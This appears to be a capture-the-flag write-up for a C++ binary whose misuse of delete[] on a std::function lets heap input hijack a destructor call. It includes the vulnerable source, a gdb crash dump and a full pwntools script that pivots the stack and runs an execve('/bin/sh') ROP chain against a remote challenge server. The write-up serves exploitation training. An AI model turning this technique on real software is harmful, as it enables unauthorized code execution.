# Déjà vu &mdash; Solution
The provided binary is a statically compiled C++ program that uses a decorator to print a name with a prefix. When run, the program crashes with the `free(): invalid pointer` message due to a common memory management bug -- `delete[]` is used to deallocate a non-array heap object.
```c++
// Decorator factory: returns a function that adds a prefix
auto make_prefix_decorator(const char* prefix) {
    return new function<void(const char*)>([prefix](const char *input) {
        puts(prefix);
        puts(input);
    });
}

int main() {
    cout.setf(ios::unitbuf);
    // Get the name from user
    cout << "Enter your name: ";
    string name;
    getline(cin, name);
    // Create a decorator that prints with "Hello, " prefix
    auto decorator = make_prefix_decorator("Hello, ");
    // Use the decorator
    (*decorator)(name.c_str());
    // Clean up
    delete[] decorator;
    return 0;
}
```

Decompiling the `main` function with a tool such as [IDA Free](https://hex-rays.com/ida-free/) reveals the logic of the `delete[]` call.
```c++
  if ( prefix_decorator )
  {
    for ( i = 32LL * *(_QWORD *)(prefix_decorator - 8) + prefix_decorator;
          i != prefix_decorator;
          std::function<void ()(char const*)>::~function(i) )
    {
      i -= 32LL;
    }
    v3 = 32LL * *(_QWORD *)(prefix_decorator - 8) + 8;
    operator delete[]((void *)(prefix_decorator - 8));
  }
```

It looks for the array size right before the pointer (in our case this will be non-zero heap metadata), then calls the destructor for each array element before freeing the memory. In libstdc++, `std::function` uses [type erasure](https://uvdn7.github.io/type-erasure/) and the destructor will call the manager function pointer. These details do not matter much and the gist is simple --- if we put a (non-NULL) function pointer at the right place in the heap, `delete[]` will call that function.

As it turns out, if we use a bit longer string for `name`, it will be allocated on the heap following the decorator, and we trigger the control hijack.

```bash
# echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > input.txt && gdb chall -ex "run < input.txt"

Enter your name: Hello,
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6161616161616161 ("aaaaaaaa"?)
$rbx   : 0x00000000a55bd0  →  "aaaaaaaaaaaaaaaaaaaaaaaa"
$rcx   : 0x00000000a55bd0  →  "aaaaaaaaaaaaaaaaaaaaaaaa"
$rdx   : 0x3
$rsp   : 0x007ffdcc88e990  →  0x007ffdcc88e9c0  →  0x007ffdcc88ea20  →  0x0000000049d080  →  <__libc_csu_init+0> push r15
$rbp   : 0x007ffdcc88e9a0  →  0x007ffdcc88e9c0  →  0x007ffdcc88ea20  →  0x0000000049d080  →  <__libc_csu_init+0> push r15
$rsi   : 0x00000000a55bd0  →  "aaaaaaaaaaaaaaaaaaaaaaaa"
$rdi   : 0x00000000a55bd0  →  "aaaaaaaaaaaaaaaaaaaaaaaa"
$rip   : 0x000000004015e9  →  <std::_Function_base::~_Function_base()+49> call rax
$r8    : 0x00000000a418c0  →  0x00000000a418c0  →  [loop detected]
$r9    : 0x0
$r10   : 0x5
$r11   : 0x246
$r12   : 0x0000000049d120  →  <__libc_csu_fini+0> push rbp
$r13   : 0x0
$r14   : 0x000000007ba018  →  0x000000004df240  →  <__rawmemchr_avx2+0> mov ecx, edi
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007ffdcc88e990│+0x0000: 0x007ffdcc88e9c0  →  0x007ffdcc88ea20  →  0x0000000049d080  →  <__libc_csu_init+0> push r15    ← $rsp
0x007ffdcc88e998│+0x0008: 0x00000000a55bd0  →  "aaaaaaaaaaaaaaaaaaaaaaaa"
0x007ffdcc88e9a0│+0x0010: 0x007ffdcc88e9c0  →  0x007ffdcc88ea20  →  0x0000000049d080  →  <__libc_csu_init+0> push r15    ← $rbp
0x007ffdcc88e9a8│+0x0018: 0x00000000401694  →  <std::function<void+0> nop
0x007ffdcc88e9b0│+0x0020: 0x000000004004a8  →  <_init+0> sub rsp, 0x8
0x007ffdcc88e9b8│+0x0028: 0x00000000a55bd0  →  "aaaaaaaaaaaaaaaaaaaaaaaa"
0x007ffdcc88e9c0│+0x0030: 0x007ffdcc88ea20  →  0x0000000049d080  →  <__libc_csu_init+0> push r15
0x007ffdcc88e9c8│+0x0038: 0x00000000401147  →  <main+188> jmp 0x401135 <main+170>
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4015dd <std::_Function_base::~_Function_base()+37> mov    rcx, QWORD PTR [rbp-0x8]
     0x4015e1 <std::_Function_base::~_Function_base()+41> mov    edx, 0x3
     0x4015e6 <std::_Function_base::~_Function_base()+46> mov    rdi, rcx
 →   0x4015e9 <std::_Function_base::~_Function_base()+49> call   rax
     0x4015eb <std::_Function_base::~_Function_base()+51> nop
     0x4015ec <std::_Function_base::~_Function_base()+52> leave
     0x4015ed <std::_Function_base::~_Function_base()+53> ret
     0x4015ee <std::_Function_base::_M_empty()+0> push   rbp
     0x4015ef <std::_Function_base::_M_empty()+0> mov    rbp, rsp
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
*0x6161616161616161 (
   $rdi = 0x00000000a55bd0 → "aaaaaaaaaaaaaaaaaaaaaaaa",
   $rsi = 0x00000000a55bd0 → "aaaaaaaaaaaaaaaaaaaaaaaa",
   $rdx = 0x00000000000003,
   $rcx = 0x00000000a55bd0 → "aaaaaaaaaaaaaaaaaaaaaaaa"
)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x4015e9 in std::_Function_base::~_Function_base() (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4015e9 → std::_Function_base::~_Function_base()()
[#1] 0x401694 → std::function<void (char const*)>::~function()()
[#2] 0x401147 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00000000004015e9 in std::_Function_base::~_Function_base() ()
gef➤

```

Hence, after figuring out the correct offset, we have the ability to call function(s) of our choice, now we need to use it to obtain shell.

As mentioned before, the binary is statically compiled, so the symbols from the `chall` binary itself are at known addresses (and plenty of useful gadgets are available inside the binary). But, since [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is used, the heap and the stack are at unknown addresses.

The model solution takes advantage of the `delete[]` bug to hijack control flow and execute a crafted ROP chain. Firstly we find the right offset using a cyclic pattern. Next, a key part of the exploit is the [stack pivot](https://ropemporium.com/challenge/pivot.html). When the destructor call hits `call rax`, we control `rax` and can redirect execution. However, our ROP payload is not on the stack yet. To solve this, we use a gadget like:

```c
0x49a0d6: mov rsp, rcx; ret;
```

This moves the stack pointer `rsp` into a heap space (pointed to by `rcx`). Once pivoted, the CPU treats our heap buffer as the call stack, and subsequent `ret` instructions chain through our injected ROP payload.

The ROP chain itself follows the classic `execve` chain generated using the [Ropper](https://github.com/sashs/Ropper) tool.

Putting it all together:
```python
#!/usr/bin/env python3

from pwn import *
from pwnlib.util.cyclic import cyclic

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 26620)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            # b *0x00000000004015e7
            continue
        ''')
    return p

def gen_rop_chain():
    from struct import pack
    p = lambda x : pack('Q', x)
    IMAGE_BASE_0 = 0x0000000000400000 # 2c50de7c1225cc1c139542704af1b4e0eb0ee550abf347c2bc8e31a2e00bb7c9
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)
    rop = b''
    rop += rebase_0(0x0000000000001843) # 0x0000000000401843: pop r13; ret;
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000000b16) # 0x0000000000400b16: pop rdi; ret;
    rop += rebase_0(0x00000000003ba120)
    rop += rebase_0(0x0000000000131af9) # 0x0000000000531af9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000001843) # 0x0000000000401843: pop r13; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000000b16) # 0x0000000000400b16: pop rdi; ret;
    rop += rebase_0(0x00000000003ba128)
    rop += rebase_0(0x0000000000131af9) # 0x0000000000531af9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000000b16) # 0x0000000000400b16: pop rdi; ret;
    rop += rebase_0(0x00000000003ba120)
    rop += rebase_0(0x00000000000036de) # 0x00000000004036de: pop rsi; ret;
    rop += rebase_0(0x00000000003ba128)
    rop += rebase_0(0x0000000000023032) # 0x0000000000423032: pop rdx; ret;
    rop += rebase_0(0x00000000003ba128)
    rop += rebase_0(0x00000000000006df) # 0x00000000004006df: pop rax; ret;
    rop += p(0x000000000000003b)
    rop += rebase_0(0x000000000013f705) # 0x000000000053f705: syscall; ret;
    return rop


p = conn()

# 0x000000000049a0d6: mov rsp, rcx; ret;
rsp_rcx_gadget = 0x000000000049a0d6

# 0x000000000040f7bd: pop r13; pop r14; pop r15; pop rbp; ret;
pop_4 = 0x000000000040f7bd

pattern = cyclic(0x1000)
offset = pattern.find(b'haafiaaf')
print(f'Offset found at: {offset}')

payload = pattern[:offset-0x10]
payload += pack(pop_4) + pack(0xdeadbeef) + pack(rsp_rcx_gadget) + pack(0xdeadbeef) + pack(0xdeadbeef)
payload += gen_rop_chain()
payload += b'b'*(0x1000 - len(payload))

p.sendline(payload)

p.interactive()
```
